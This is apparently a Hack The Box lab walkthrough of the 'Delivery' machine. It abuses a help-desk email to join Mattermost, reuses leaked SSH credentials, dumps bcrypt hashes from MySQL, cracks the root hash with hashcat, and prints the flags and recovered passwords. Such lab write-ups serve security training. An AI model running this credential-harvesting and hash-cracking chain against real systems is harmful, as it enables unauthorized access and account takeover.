# DELIVERY

## NMAP

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/delivery]
└─$ nmap 10.10.10.222                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 06:53 EDT
Nmap scan report for 10.10.10.222
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 40.47 seconds
                                                                                            
┌──(kali㉿kali)-[~/Downloads/hackthebox/delivery]
└─$ nmap 10.10.10.222 -p 22,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-21 06:54 EDT
Nmap scan report for 10.10.10.222
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80

### WEBPAGE

![](https://github.com/Leo-2807/Writeups/blob/main/images/delivery1.png)


## HELP-DESK

Clicking on the `help desk` link

![](https://github.com/Leo-2807/Writeups/blob/main/images/delivery2.png)

Okay so I created a ticket which gave me email with `@delivery.htb`

![](https://github.com/Leo-2807/Writeups/blob/main/images/delivery4.png)

On opening the view ticket thread page and loging in with our email and ticket code it just shows the update we get on the ticket

## MATTERMOST

On clicking the `contact us` we got to the `contact us` page and on that page clicking the `mattermost` link we got redircted to `mattermost login page on port 8065`

![](https://github.com/Leo-2807/Writeups/blob/main/images/delivery3.png)

I found some hints while enumerating that this login requires a `@delivery.htb` email address and We have one from the ticket we created
I create a account using that email address but it asks for confirmation email

It took me some time but I remembered the `view ticket thread `
page which was showing updates on our ticket 
On refreshing that page I found the confirmation mail

![](https://github.com/Leo-2807/Writeups/blob/main/images/delivery6.png)

On going to the link suggested in the mail I confirmed my account and now we are in

![](https://github.com/Leo-2807/Writeups/blob/main/images/delivery7.png)

## SSH

On reading the chats on the mattermost internal channel we get creds
`maildeliverer:Youve_G0t_Mail! `

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/delivery]
└─$ ssh maildeliverer@10.10.10.222                                                      1 ⨯
The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.
ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts.
maildeliverer@10.10.10.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ whoami
maildeliverer
```

## USER.TXT

```
maildeliverer@Delivery:~$ ls
user.txt
maildeliverer@Delivery:~$ cat user.txt
c569504e9ce28b46fa5931e5f449d525
```
## ROOT.TXT

On enumerating through the machine I found something in the `/opt/mattermost/config/config.json` file

```
SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    },
```

### SQL

```     
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -pCrack_The_MM_Admin_PW mattermost
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 104
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [mattermost]> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [mattermost]> use mattermost;
Database changed
MariaDB [mattermost]> show tables;
+------------------------+
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
| ChannelMembers         |
| Channels               |
| ClusterDiscovery       |
| CommandWebhooks        |
| Commands               |
| Compliances            |
| Emoji                  |
| FileInfo               |
| GroupChannels          |
| GroupMembers           |
| GroupTeams             |
| IncomingWebhooks       |
| Jobs                   |
| Licenses               |
| LinkMetadata           |
| OAuthAccessData        |
| OAuthApps              |
| OAuthAuthData          |
| OutgoingWebhooks       |
| PluginKeyValueStore    |
| Posts                  |
| Preferences            |
| ProductNoticeViewState |
| PublicChannels         |
| Reactions              |
| Roles                  |
| Schemes                |
| Sessions               |
| SidebarCategories      |
| SidebarChannels        |
| Status                 |
| Systems                |
| TeamMembers            |
| Teams                  |
| TermsOfService         |
| ThreadMemberships      |
| Threads                |
| Tokens                 |
| UploadSessions         |
| UserAccessTokens       |
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.001 sec)

MariaDB [mattermost]> SELECT Username,Password FROM Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| tria                             | $2a$10$egwTZfobwaeSO.8l/H98M.j4npYXvNEuq0uUWmTQggwHswuC/z/rS |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
```

### PASSWORD

We can crack the hashed password of root using hashcat and rockyou.txt as written on internal channel on mattermost

We also know that the password is going to be a variation of `PleaseSubscribe! `

After saving the hash in `root` file and the string `PleaseSubscribe!` in `password` file I run hashcat 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/delivery]
└─$ hashcat -m 3200 root password --user -r /usr/share/hashcat/rules/best64.rule
```

```
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
```

### SU

```
maildeliverer@Delivery:/opt/mattermost/config$ su root
Password: 
root@Delivery:/opt/mattermost/config# cd /root
root@Delivery:~# cat root.txt
685cbf29c4b39860709701d0c4162d07
```











